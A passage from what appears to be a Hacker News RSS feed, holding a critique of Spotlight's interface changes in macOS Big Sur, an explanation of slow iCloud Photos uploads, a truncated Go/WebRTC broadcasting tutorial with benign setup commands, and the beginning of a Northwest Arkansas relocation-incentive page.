<p>It’s clear that hiding the preview is an attempt to make the interface appear simpler and more iOS-like. Indeed, it frees up space; but the new space isn’t actually used for anything. For most queries, this space is left completely empty. What’s worse, this whitespace visually separates the results from the crucial new interface element on the far right side, the <em>disclosure indicator</em>.</p>

<h2 id="spotlight-11-disclosure-indicators">Disclosure Indicators</h2>

<p>Some results have a small iOS-style arrow on the far right side. Apple refers to this arrow as a disclosure indicator. It indicates that pressing <code>Return</code> on this result will not open anything, but will instead display the preview on the right side of the window.</p>

<p>Once the preview is displayed, pressing <code>Return</code> again will open the result, even though the disclosure indicator is still present.</p>

<p><img src="https://lacona.app/img/posts/spotlight-2.png" alt="Spotlight &quot;apple stock&quot; screenshot"></p>

<p>These results can be very useful! However, for the first time in Spotlight’s history, ambiguity is introduced to the <code>Return</code> key. Some may consider this necessary complexity, but it’s not the last inconsistency we’ll see today.</p>

<h2 id="spotlight-11-suggestions">Suggestions</h2>

<p>In addition to showing search results, Spotlight now has an additional unlabeled section which I call <em>suggestions</em>. Directly below the unlabeled “top results” section for any given search, there is a section containing a handful of queries that Spotlight believes you may be typing. Some of these queries show the icon of your default web browser, and others show a Spotlight icon and have a disclosure indicator. The number and order of these results varies, but they could take up as much as 83% of the results “above the fold”.</p>

<p><img src="https://lacona.app/img/posts/spotlight-3.png" alt="Spotlight &quot;apple&quot; screenshot"></p>

<p>These suggestions are based on both “Siri Suggestions” and the files of your Mac. This behavior is interesting, but I can’t say it’s very useful; the files referenced always show up further down on the list.</p>

<p>When selecting one of the results with the web browser icon, Spotlight will search for the query using your default web search engine in your default browser.</p>

<p>When selecting one of the results with the Spotlight icon, your input query will change to the suggestion, and the preview will also be shown.</p>

<h4 id="the-problem-with-suggestions">The Problem with Suggestions</h4>

<p>The most important inconsistencies with these suggestions come when using the mouse. Since the inception of OSX, clicking has meant <em>select</em>. Single-click a file in Finder or a track in Music, and it will be selected. This is how Spotlight used to work, and all non-suggestion results in Spotlight still work this way.</p>

<p>However, for suggestion results, clicking will <em>activate them immediately</em>. This, you may notice, is the way things work on iPadOS. Not only is this inconsistent with macOS in general, it is inconsistent with other results <em>on the very same list</em>. Worse still, because the suggestions section is unlabeled, it becomes harder to figure out exactly what clicking on a result will do.</p>

<p>Even with the keyboard, these suggestions behave completely differently from all other results. I originally tried to write out all different cases, but the inconsistencies are too numerous to list with text. I’ve attached an <a href="#spotlight-11-appendix">appendix</a> enumerating all the cases.</p>

<p>Overall, the suggestions section is Spotlight’s biggest step backward in usability. Its behavior is inconsistent and confusing, it takes up huge portions of the most important result space, and its utility is situational at best. Worst of all, this is the only section which cannot be fully disabled in the Spotlight preferences. <em>You’re stuck with it.</em></p>

<h2 id="spotlight-11-recommendations">Recommendations</h2>

<p>To make your search experience better, here are some recommendations:</p>

<ul>
  <li>Expand the window by dragging from the bottom, so that more results can be displayed.</li>
  <li>Ignore the “suggestions” section and its inconsistent behavior.</li>
  <li>Consider disabling “Siri Suggestions” in the Spotlight preferences, which removes many (but not all) of the suggestions.</li>
  <li>Don’t rely on the mouse for selecting items. Use the <code>⌘+Down</code> and <code>⌘+Up</code> shortcuts to quickly move the selection between entire sections with the keyboard.</li>
  <li>Press <code>Tab</code> whenever you want to see a Preview of the results.</li>
  <li>Consider using a Spotlight alternative with a more considered design.</li>
</ul>

<h2 id="conclusion">Conclusion</h2>

<p>Spotlight in macOS 11 Big Sur is torn between two between different worlds.</p>

<p>In one dimension, it introduced iOS ideas like disclosure indicators and single-tap actions for its new features. However, it only went half way, leading to an inconsistent and unpredictable experience.</p>

<p>In another dimension, it is trying to introduce AI-powered suggestions to make Spotlight more proactive and Siri-like. However, these suggestions are too constrained by the existing Spotlight interface to be very useful, and take up valuable space that could be used for the more reliable features.</p>

<p>In future releases, I hope that Apple can push Spotlight fully into simplified iOS paradigm, or retreat to the power of macOS. In macOS 11 Big Sur, it tries to straddle the line and fails at both.</p>

<h2 id="spotlight-11-appendix">Appendix: Behavior Changes</h2>

<h4 id="spotlight-behavior-in-macos-1015-catalina-and-prior">Spotlight Behavior in macOS 10.15 Catalina (and Prior)</h4>

<table>
  <thead>
    <tr>
      <th>&nbsp;</th>
      <th>Return</th>
      <th>Click</th>
      <th>Double Click</th>
      <th>⌘+Return</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>File Result</td>
      <td>Open</td>
      <td>Select</td>
      <td>Open</td>
      <td>Show in Finder</td>
    </tr>
    <tr>
      <td>Other Result</td>
      <td>Open</td>
      <td>Select</td>
      <td>Open</td>
      <td>Open</td>
    </tr>
  </tbody>
</table>

<h4 id="spotlight-behavior-in-macos-11-big-sur">Spotlight Behavior in macOS 11 Big Sur</h4>

<table>
  <thead>
    <tr>
      <th>&nbsp;</th>
      <th>Return</th>
      <th>Tab</th>
      <th>Click (Selected)</th>
      <th>Click (Unselected)</th>
      <th>Double Click</th>
      <th>⌘+Return</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>File Result</td>
      <td>Open</td>
      <td>Show preview</td>
      <td>Open</td>
      <td>Select and show preview</td>
      <td>Open</td>
      <td>Show in Finder</td>
    </tr>
    <tr>
      <td>Web Result</td>
      <td>Open</td>
      <td>Show preview</td>
      <td>Open</td>
      <td>Select and show preview</td>
      <td>Open</td>
      <td>Show preview</td>
    </tr>
    <tr>
      <td>Result with disclosure indicator</td>
      <td>Show preview</td>
      <td>Show preview</td>
      <td>Show preview</td>
      <td>Select and show preview</td>
      <td>Open</td>
      <td>None</td>
    </tr>
    <tr>
      <td>Previewed result with disclosure indicator</td>
      <td>Open</td>
      <td>None</td>
      <td>Open</td>
      <td>Select</td>
      <td>Open</td>
      <td>None</td>
    </tr>
    <tr>
      <td>Spotlight Completion</td>
      <td>Modify input</td>
      <td>Select input</td>
      <td>Modify input</td>
      <td>Modify input</td>
      <td>Modify input</td>
      <td>None</td>
    </tr>
    <tr>
      <td>Browser Completion</td>
      <td>Open</td>
      <td>Select input</td>
      <td>Open</td>
      <td>Open</td>
      <td>Open</td>
      <td>None</td>
    </tr>
    <tr>
      <td>Other Result</td>
      <td>Open</td>
      <td>Show preview</td>
      <td>Open</td>
      <td>Select and show preview</td>
      <td>Open</td>
      <td>Open</td>
    </tr>
  </tbody>
</table>
</div></div>]]>
            </description>
            <link>https://lacona.app/blog/2020/11/11/spotlight-changes-in-big-sur.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25072845</guid>
            <pubDate>Thu, 12 Nov 2020 18:18:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why iCloud Photos is slow to upload on macOS]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25072695">thread link</a>) | @shivpatelssp
<br/>
November 12, 2020 | https://shivpatel.io/software/2020/11/12/how-icloud-photos-architecture-causes-slow-uploads.html | <a href="https://web.archive.org/web/*/https://shivpatel.io/software/2020/11/12/how-icloud-photos-architecture-causes-slow-uploads.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>The word <em>uploads</em> is in quotes for a reason. Let’s find out why…</p>


<ul>
  <li>2019 16” MacBook Pro
    <ul>
      <li>2.6 GHz 6-Core Intel Core i7</li>
      <li>macOS Catalina 10.15.7</li>
      <li>Photos 5.0 (161.0.120)</li>
    </ul>
  </li>
  <li>Roughly 1,800 media files (JPG, HEIC, PNG, MOV, MP4) totaling 50GB</li>
  <li>Full gigabit connection (1,000 Mbps up, 1,000 Mbps down)</li>
  <li>Google Photos as a benchmark for comparison</li>
</ul>



<p>First, I tried Google Photos. Drag-and-drop into the Chrome tab. Roughly 20 minutes later all 50GB worth of media is done uploading.</p>

<p>I’m able to view most my media instantly online. Google takes 3 hours to further process 160 videos in my upload; likely to convert them into a more compatible format (<em>foreshadowing</em>).</p>

<p>This experience seems reasonable, so let’s use it as our baseline.</p>



<p>I upgrade my account to the 200GB tier and enable iCloud Photo syncing on my Mac. Drag and drop the media files into the native Photos app and off we go!</p>

<p>One hour later… only 31 items uploaded. 😯</p>

<p>Eight hours later… only 97 items uploaded. 🤔</p>

<p>My ISP can’t be the issue. Google Photos had worked fine. I’m able to browser the web just fine. My Mac doesn’t seem to be doing anything intensive either; no excessive heat or fan noise.</p>

<p>A few DuckDuckGo searches later, it’s becoming very apparent others are experiencing the same issue. Most people blame Apple’s servers for being slow or rant about how bad their ISP is. Something doesn’t seem right.</p>



<p>I start my debugging process in Activity Monitor. Things become obvious very quick:</p>

<p><img src="https://shivpatel.io/assets/icloud-photos-activity-monitor.png" alt="iCloud Photos Upload Processes"></p>

<p>Let’s breakdown the two processes:</p>

<p><code>VTEncoderXPCService</code> is a sandboxed host used by QuickTime for video and audio decoding. The VT stands for <code>VideoTooolbox</code>. It’s used to process content when an app calls the built-in macOS audio and video API. It could be triggered by the Photos app, but it could also be a video playing in a web browser like Firefox.</p>

<p><code>com.apple.photos.VideoConversionService</code> doesnt need an explanation. The name gives it all away.</p>

<p>Considering the latter process name and the fact that I didn’t have any other apps open at the time, it’s pretty obvious Photos is doing some sort of video conversion. But why?</p>

<p>After some more research, I came across the following statement on Apple’s website:</p>

<blockquote>
  <p>File types that you can use with iCloud Photos</p>
</blockquote>

<blockquote>
  <p>Your photos and videos are stored in iCloud exactly as you took them. All of your images are held in their original formats at full resolution — HEIF, JPEG, RAW, PNG, GIF, TIFF, HEVC, and MP4 — as well as special formats you capture with your iPhone, like slo-mo, time-lapse, 4K videos, and Live Photos.</p>
</blockquote>

<p>Source: <a href="https://support.apple.com/en-us/HT204264">https://support.apple.com/en-us/HT204264</a></p>

<p>Ah ha! If you recall earlier, I mentioned my test media included MOV files. These are old family videos converted and exported via QuickTime Player. MOV is not a supported format according to the above statement.</p>

<p>Additionally, when I track the upload count in the Photos app, I can infer that media is being uploaded by date; newest to oldest. The count consistently lags at the index of an MOV file.</p>

<p><img src="https://shivpatel.io/assets/icloud-photos-progress-bar.png" alt="Photos Progress Bar"></p>



<p>Photos is likely converting incompatible media files into an iCloud desired format before uploading them.</p>

<p>More importantly, <strong>it seems Apple has made the architectural decision to convert incompatible iCloud media on the end user’s device, instead of processing it in the cloud</strong> like Google Photos.</p>



<p>Converting before uploading isn’t a big deal. Heck, I give Apple credit for choosing a decentralized and cost efficient architecture.</p>

<p><strong>The real issue is an overly simplified user experience that’s missing transparency.</strong> It took an  engineer an hour to figure out what was happening. I can only imagine how millions of non-technical Apple users would feel. Search Google and you’ll see the widespread frustration and confusion with iCloud Photos and “slow uploads.”</p>



<p>We all know when our Mac has entered beast mode to tackle CPU intensive tasks; fans blazing and toasty to the touch. Try converting video files in <a href="http://handbrake.fr/">HandBrake</a> and you’ll see exactly what I’m saying.</p>

<p><strong>The Photos app however, avoids beast mode and slows the rate of video conversion in the background.</strong> It makes sense that Apple does not want to impair your foreground experience or raise concerns by running your Mac at full speed. <strong>But it also makes it really hard to see what’s happening and significantly increases the time required to complete conversions.</strong></p>



<p>Here are a few recommendations (for Apple) that could improve the perception and experience with iCloud Photos on macOS:</p>

<ul>
  <li>Call out incompatible media. <strong>Make it known when media needs to be converted.</strong> Or require incompatible media to be converted upon import into the Photos app.</li>
  <li>A progress bar stuck at 90% is more satisfying than one at 50%. <strong>Prioritize the upload of compatible media first.</strong> If your incompatible media is more recent, you’ll be stuck waiting for it convert before anything else gets uploaded.</li>
  <li><strong>Provide more insight</strong> as to when uploading vs conversion is happening behind-the-scenes.</li>
  <li><strong>Run full speed conversions when the Photos app is in the foreground.</strong></li>
</ul>



<p>My Mac has been plugged in 24/7 for the past 4 days and I still have 177 items left to “upload.”</p>



<p>iCloud Photos on macOS converts incompatible media locally before uploading to iCloud. It disguises the conversion process as part of the “upload” phase for iCloud Photos.</p>

<p><em>This issue is only with incompatible media imported to iCloud Photos via the Mac Photos app. It’s very unlikely your iPhone or iPad would be taking pictures and videos in an incompatible format.</em></p>

  </div></div>]]>
            </description>
            <link>https://shivpatel.io/software/2020/11/12/how-icloud-photos-architecture-causes-slow-uploads.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25072695</guid>
            <pubDate>Thu, 12 Nov 2020 18:07:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a WebRTC Broadcaster in Golang using ion-sfu and media devices]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25072605">thread link</a>) | @taylored
<br/>
November 12, 2020 | https://gabrieltanner.org/blog/broadcasting-ion-sfu | <a href="https://web.archive.org/web/*/https://gabrieltanner.org/blog/broadcasting-ion-sfu">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section> <section><div uk-grid=""><div><section>  <!----> <section><!--kg-card-begin: markdown--><p>WebRTC, short for Web Real-Time Communication, is a communication protocol that enables real-time audio, video and data transmission on the web by utilizing peer to peer connections.</p>
<p>WebRTC also provides a Javascript API that is available by default in most browsers and helps developers implement the protocol in their applications. But there are also some implementations of the WebRTC protocol in other languages.</p>
<p>In this tutorial, you will build a video broadcasting application that reads the camera in Golang and sends it to the ION-SFU (Selective forwarding unit) which allows WebRTC sessions to scale more efficiently.</p>
<p>The application will also feature a small frontend that lets you watch the video you published by reading it from the ION-SFU server.</p>
<h2 id="prerequisites">Prerequisites</h2>
<p>Before you begin this guide, you’ll need the following:</p>
<ul>
<li>A valid Golang installation.</li>
<li>Camera connected to your computer that can be read using Video for Linux as a source for the video stream.</li>
<li>(Optional) If you want to connect with devices that are not on your network you will need to add a TURN server to your application. If you want to know more about TURN and how to set up your own check out <a href="https://gabrieltanner.org/blog/turn-server">this article</a>.</li>
</ul>
<h2 id="technologystack">Technology Stack</h2>
<p>Now that you have an overview of what you are going to build let's take a closer look at the tools in use and how they work with each other.</p>
<!-- TODO: Add illustration -->
<p>Let's break the different components down:</p>
<ul>
<li><a href="https://github.com/pion/webrtc">Pion</a> - Pure Golang implementation of the WebRTC protocol. Used to establish a peer connection to ION-SFU and send the video stream.</li>
<li><a href="https://github.com/pion/ion-sfu">ION SFU</a> - ION SFU (Selective Forwarding Unit) is a video routing service that allows Webrtc sessions to scale more efficiently.</li>
<li><a href="https://github.com/pion/mediadevices">Pion mediadevices</a> - Golang implementation of the <a href="https://developer.mozilla.org/en-US/docs/Web/API/MediaDevices">Mediadevices API</a> which is used to read the camera as a Mediastream that can be sent using the peer connection.</li>
</ul>
<p>One main benefit of this is that you can read the camera without the need to open a browser tab. Using a selective forwarding unit will also help a lot with performance and scaling the application for a large size of users.</p>
<p>This article assumes a basic knowledge of WebRTC. If you do not have any previous experience, I recommend reading the free book <a href="https://webrtcforthecurious.com/docs/01-what-why-and-how/">WebRTC for the curious</a>.</p>
<h2 id="settingupionsfu">Setting up ION-SFU</h2>
<p>In this section, you will clone and configure the ION-SFU server so that you can use it with your application.</p>
<p>First, you will clone the repository so you have all the resources needed to start setting up your selective forwarding unit:</p>
<pre><code>git clone https://github.com/pion/ion-sfu.git
</code></pre>
<p>This command will clone the ION-SFU repository from Github and create a folder with the name of <strong>ion-sfu</strong> in your directory. Now enter the directory using the following command:</p>
<pre><code>cd ion-sfu
</code></pre>
<p>Next you can edit the configuration of the sfu by changing the <strong>config.toml</strong> file. The standard configurations are fine for testing and local use but I would recommend adding a STUN and TURN server if you try to access the server from a device in another network.</p>
<p>If you are not sure how to create a TURN server I would recommend reading <a href="https://gabrieltanner.org/blog/turn-server">this guide</a>.</p>
<p>Once you are done with the configuration you can start the server using the following command:</p>
<pre><code>go build ./cmd/signal/json-rpc/main.go &amp;&amp; ./main -c config.toml
</code></pre>
<p>Alternatively you can also start the server using Docker if you prefer that over starting it using Golang.</p>
<pre><code>docker run -p 7000:7000 -p 5000-5020:5000-5020/udp pionwebrtc/ion-sfu:latest-jsonrpc
</code></pre>
<p>You have now successfully set up your ION-SFU server and should see the following output in the console.</p>
<pre><code>config config.toml load ok!
[2020-10-12 19:04:19.017] [INFO] [376][main.go][main] =&gt; --- Starting SFU Node ---
[2020-10-12 19:04:19.018] [INFO] [410][main.go][main] =&gt; Listening at http://[:7000]
</code></pre>
<h2 id="creatingtheproject">Creating the project</h2>
<p>Now that the setup and configuration of the ion-sfu server are done it is time to create the project</p>
<p>First, you will need to create a directory and enter it.</p>
<pre><code>mkdir mediadevice-broadcast &amp;&amp; cd mediadevice-broadcast
</code></pre>
<p>After that you can continue by creating all the files needed for the project using the following command:</p>
<pre><code>mkdir public
touch main.go public/index.html public/index.js public/style.css
</code></pre>
<p>There are also two packages that need to be installed to follow this article.</p>
<pre><code>sudo apt-get install -y v4l-utils
sudo apt-get install -y libvpx-dev
</code></pre>
<p>If you are not on Linux you might need to download different packages. Look at the <a href="https://github.com/pion/mediadevices">media devices documentation</a> for more information.</p>
<h2 id="establishingawebrtcconnection">Establishing a WebRTC connection</h2>
<p>Before any data can be exchanged using WebRTC, there must first be an established peer-to-peer connection between two WebRTC agents. Since the peer-to-peer connection often cannot be established directly there needs to be some signaling method.</p>
<p>Signaling to the ion-sfu will be handled over the Websockets protocol. For that, we will implement a simple Websockets boilerplate using the <em>gorilla/websocket</em> library that connects to the Websockets server and allows us to receive the incoming message and send our own.</p>
<pre><code>package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/url"

	"github.com/google/uuid"
	"github.com/gorilla/websocket"
)

var addr string

func main() {
	flag.StringVar(&amp;addr, "a", "localhost:7000", "address to use")
	flag.Parse()

	u := url.URL{Scheme: "ws", Host: addr, Path: "/ws"}
	log.Printf("connecting to %s", u.String())

	c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
	if err != nil {
		log.Fatal("dial:", err)
	}
	defer c.Close()

	// Read incoming Websocket messages
	done := make(chan struct{})

	go readMessage(c, done)

	&lt;-done
}

func readMessage(connection *websocket.Conn, done chan struct{}) {
	defer close(done)
	for {
		_, message, err := connection.ReadMessage()
		if err != nil || err == io.EOF {
			log.Fatal("Error reading: ", err)
			break
		}

		fmt.Printf("recv: %s", message)
	}
}
</code></pre>
<p>Now let's walk through the code for better understanding:</p>
<ul>
<li>The flag is used to dynamically provide the URL of the Websockets server when starting the script and has a standard value of <strong>localhost:7000</strong></li>
<li>The URL is used to create a Websockets client using the <strong>Dial</strong> method. Then we check if the connection resulted in an error and print a log if that is the case.</li>
<li>The <strong>readMessage</strong> function then reads the incoming messages by calling <strong>ReadMessage()</strong> on the Websocket connection and is run as a Go routine so it doesn't block the main thread and can run in the background.</li>
<li>The last line of the <strong>main()</strong> function makes sure that the script runs as long as the <strong>done</strong> variable is not closed.</li>
</ul>
<p>The next step is creating a peer connection to the ion-sfu and handling the incoming WebRTC signaling events.</p>
<pre><code>var peerConnection *webrtc.PeerConnection

func main() {
...

    config := webrtc.Configuration{
		ICEServers: []webrtc.ICEServer{
			{
				URLs: []string{"stun:stun.l.google.com:19302"},
			},
			/*{
				URLs:       []string{"turn:TURN_IP:3478?transport=tcp"},
				Username:   "username",
				Credential: "password",
			},*/
		},
		SDPSemantics: webrtc.SDPSemanticsUnifiedPlanWithFallback,
	}

	// Create a new RTCPeerConnection
	mediaEngine := webrtc.MediaEngine{}

	vpxParams, err := vpx.NewVP8Params()
	if err != nil {
		panic(err)
	}
	vpxParams.BitRate = 500_000 // 500kbps

	codecSelector := mediadevices.NewCodecSelector(
		mediadevices.WithVideoEncoders(&amp;vpxParams),
	)

	codecSelector.Populate(&amp;mediaEngine)
	api := webrtc.NewAPI(webrtc.WithMediaEngine(mediaEngine))
	peerConnection, err = api.NewPeerConnection(config)
	if err != nil {
		panic(err)
	}

}
</code></pre>
<p>Here we first create a WebRTC config where we define our STUN and TURN server that will be used in the signaling process. After, that we create a <em>MediaEngine</em> that lets us define the codecs supported by the peer connection.</p>
<p>With all that configuration done we can create a new peer connection by calling the <strong>NewPeerConnection</strong> function on the WebRTC API we just created.</p>
<p>Before sending the offer to the ion-sfu server over Websockets we first need to add the video and audio stream. This is where the media device library comes into play to read the video from the camera.</p>
<pre><code>    fmt.Println(mediadevices.EnumerateDevices())

	s, err := mediadevices.GetUserMedia(mediadevices.MediaStreamConstraints{
		Video: func(c *mediadevices.MediaTrackConstraints) {
			c.FrameFormat = prop.FrameFormat(frame.FormatYUYV)
			c.Width = prop.Int(640)
			c.Height = prop.Int(480)
		},
		Codec: codecSelector,
	})

	if err != nil {
		panic(err)
	}

	for _, tracker := range s.GetTracks() {
		tracker.OnEnded(func(err error) {
			fmt.Printf("Track (ID: %s) ended with error: %v\n",
				tracker.ID(), err)
		})

		webrtcTrack, err := tracker.Bind(peerConnection)
		if err != nil {
			panic(err)
		}

		_, err = peerConnection.AddTransceiverFromTrack(webrtcTrack,
			webrtc.RtpTransceiverInit{
				Direction: webrtc.RTPTransceiverDirectionSendonly,
			},
		)

		if err != nil {
			panic(err)
		}
	}
</code></pre>
<p>Once an instance of the media devices library is created using the peer connection you can get the user media using the <strong>GetUserMedia</strong> function and passing the parameters.</p>
<p>One configuration change you might need to make is altering the <strong>FrameFormat</strong> to support your connected camera. You can check the frame format of your camera with the following command:</p>
<pre><code>v4l2-ctl --all
</code></pre>
<p>All supported formats can also be found in the <a href="https://github.com/pion/mediadevices/blob/master/pkg/frame/decode.go#L7-L26">media devices Github repository</a>.</p>
<p>The offer can now be created and saved into the local description of the peer connection.</p>
<pre><code>    // Creating WebRTC offer
	offer, err := peerConnection.CreateOffer(nil)

	// Set the remote SessionDescription
	err = peerConnection.SetLocalDescription(offer)
	if err != nil {
		panic(err)
	}
</code></pre>
<p>The next step is to send the offer over to the sfu using Websockets. The Websockets message is JSON and needs a specific structure to be recognized by the sfu.</p>
<p>Therefore we need to create a struct holding our offer and the required sid that specifies the room we want to join that we can then convert into JSON.</p>
<pre><code>type SendOffer struct {
	SID   string                     `json:sid`
	Offer *webrtc.SessionDescription `json:offer`
}
</code></pre>
<p>Now we convert our offer …</p></section></section></div></div></section></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://gabrieltanner.org/blog/broadcasting-ion-sfu">https://gabrieltanner.org/blog/broadcasting-ion-sfu</a></em></p>]]>
            </description>
            <link>https://gabrieltanner.org/blog/broadcasting-ion-sfu</link>
            <guid isPermaLink="false">hacker-news-small-sites-25072605</guid>
            <pubDate>Thu, 12 Nov 2020 17:59:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[$10K and a free bike incentive to move to NW Arkansas]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25072346">thread link</a>) | @bboyan
<br/>
November 12, 2020 | https://findingnwa.com/incentive/ | <a href="https://web.archive.org/web/*/https://findingnwa.com/incentive/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<div>
		<div>
			
			
		<div id="fws_5fb0ab0b4324f" data-column-margin="default" data-midnight="light" data-top-percent="12%" data-bottom-percent="10%"><div>
	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="fade-in" data-delay="0">
		<div>
			<div>
				
<div>
	<p>The Northwest Arkansas Council is investing more than $1 million over six months to attract top talent to the region through the Life Works Here initiative, which brings to light the lifestyle and career benefits offered by the region.</p>
</div>




			</div> 
		</div>
	</div> 

	 
</div></div>
		
		
		<div id="overview" data-column-margin="default" data-midnight="dark" data-top-percent="5%" data-bottom-percent="3%"><div>
	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="" data-delay="0">
		<div>
			<div>
				<div id="fws_5fb0ab0b47ac5" data-midnight="" data-column-margin="default"><div>
	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="" data-delay="0">
		<div>
		<p>
			<h2>Welcome to Northwest Arkansas</h2>
		</p> 
	</div>
	</div> 
</div></div><div id="fws_5fb0ab0b480e1" data-midnight="" data-column-margin="default"><div>
	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="" data-delay="0">
		<div>
		<div>
			
<div>
	<p>
		<h4><span>With one of the best costs of living, plentiful outdoor lifestyle perks, nationally ranked arts, culture and cuisine scenes, and per capita income that’s 14% higher than the national average, the Northwest Arkansas region offers a unique opportunity to create balance for those eager to move from congested and expensive larger cities and suburbs.</span></h4>
	</p>
</div>




		</div> 
	</div>
	</div> 
</div></div>
			</div> 
		</div>
	</div> 
</div></div>
		<div id="fws_5fb0ab0b48577" data-column-margin="none" data-midnight="light" data-top-percent="2%" data-bottom-percent="6%"><div>
	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="fade-in" data-delay="0">
		<div>
			<div>
				<div id="fws_5fb0ab0b487c0" data-midnight="" data-column-margin="default"><div>
	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="left" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="" data-delay="0">
		<div>
		<div>
			<div data-max-width="125%" data-max-width-mobile="default" data-border-radius="none" data-shadow="none" data-animation="fade-in">
      <div>
        <div data-hover-animation="none"> 
          <p><img data-delay="0" height="625" width="910" data-animation="fade-in" src="https://findingnwa.com/wp-content/uploads/2018/08/oztrail.png" alt="" srcset="https://findingnwa.com/wp-content/uploads/2018/08/oztrail.png 910w, https://findingnwa.com/wp-content/uploads/2018/08/oztrail-300x206.png 300w, https://findingnwa.com/wp-content/uploads/2018/08/oztrail-768x527.png 768w, https://findingnwa.com/wp-content/uploads/2018/08/oztrail-600x412.png 600w" sizes="(min-width: 1450px) 75vw, (min-width: 1000px) 85vw, 100vw">
          </p>
        </div>
      </div>
    </div>
		</div> 
	</div>
	</div> 
</div></div>
			</div> 
		</div>
	</div> 

	<div data-using-bg="true" data-t-w-inherits="default" data-overlay-color="true" data-bg-cover="" data-padding-pos="all" data-has-bg-color="true" data-bg-color="#ef404d" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="" data-delay="0">
		<div>
			<div>
				<div id="fws_5fb0ab0b49555" data-midnight="" data-column-margin="default"><div>
	 

	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="fade-in-from-bottom" data-delay="0">
		<div>
		<div>
			<p data-style="half_text" data-using-custom-color="true" data-animation-delay="false" data-color="#ffcdc0" data-color-gradient="rgba(255,107,48,0.01)">
<h2>You’re looking for a great place to <em>live, work and play.</em></h2>
</p>
<div>
	<p>We’re looking for new residents to add to the vibrancy of our growing community.</p>
</div>




		</div> 
	</div>
	</div> 
</div></div>
			</div> 
		</div>
	</div> 
</div></div>
		<div id="possible" data-column-margin="default" data-midnight="light" data-top-percent="10%" data-bottom-percent="10%"><div>
	 

	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="grow-in" data-delay="300">
		<div>
			<div>
				
	<div>
		<div>
			
			<p><iframe title="What Makes a Community Feel Like Home?" width="1080" height="608" src="https://www.youtube.com/embed/yNN-5rYKIeI?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
		</div>
	</div>

			</div> 
		</div>
	</div> 
</div></div>
		<div id="benefits" data-column-margin="none" data-midnight="dark"><div>
	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="" data-delay="0">
		<div>
			<div>
				<div id="fws_5fb0ab0b4c41f" data-midnight="" data-column-margin="default"><div>
	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="fade-in-from-bottom" data-delay="0">
		<div>
		<div>
			<p data-style="half_text" data-using-custom-color="true" data-animation-delay="false" data-color="#ef404d" data-color-gradient="rgba(255,107,48,0.01)">
<h3>What we’re doing</h3>
</p>
<div>
	<div>
		<p>The <a href="https://www.nwacouncil.org/" target="_blank" rel="noopener noreferrer">Northwest Arkansas Council</a> is investing more than $1 million over six months to attract top talent to the region through the Life Works Here initiative, which brings to light the lifestyle and career benefits offered by the region.</p>
<p>The initiative is sponsored by the Northwest Arkansas Council and made possible by philanthropic support from the <a href="https://www.waltonfamilyfoundation.org/" target="_blank" rel="noopener noreferrer">Walton Family Foundation</a> at the recommendation of Steuart Walton and Tom Walton.</p>
	</div>
</div>




		</div> 
	</div>
	</div> 
</div></div><div id="fws_5fb0ab0b4c783" data-midnight="" data-column-margin="default"><div>
	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="fade-in-from-bottom" data-delay="0">
		<div>
		<div>
			<p data-style="half_text" data-using-custom-color="true" data-animation-delay="false" data-color="#ef404d" data-color-gradient="rgba(255,107,48,0.01)">
<h3>What’s in it for you?</h3>
</p>
<div>
	<div>
